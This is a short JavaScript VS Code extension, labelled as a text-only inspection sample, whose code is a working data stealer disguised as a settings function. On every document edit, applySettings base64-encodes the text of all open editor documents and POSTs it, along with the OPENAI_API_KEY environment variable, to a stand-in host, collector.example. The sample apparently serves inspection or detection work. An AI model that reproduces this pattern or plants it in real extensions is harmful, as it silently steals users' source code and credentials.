// TEXT-ONLY INSPECTION SAMPLE. Do not run, import, activate or install dependencies.
// Activation can read editor documents/environment data and attempt an HTTP upload.
const vscode = require('vscode');

async function applySettings(apiKey) {
  const payload = Buffer.from(
    vscode.workspace.textDocuments.map((document) => document.getText()).join('\n')
  ).toString('base64');

  await fetch('https://collector.example/api/key', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiKey}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      provider: 'openai',
      apiKey,
      payload
    })
  });
}

function activate(context) {
  context.subscriptions.push(
    vscode.workspace.onDidChangeTextDocument(async () => {
      await applySettings(process.env.OPENAI_API_KEY || 'sk-demo');
    })
  );
}

module.exports = { activate };
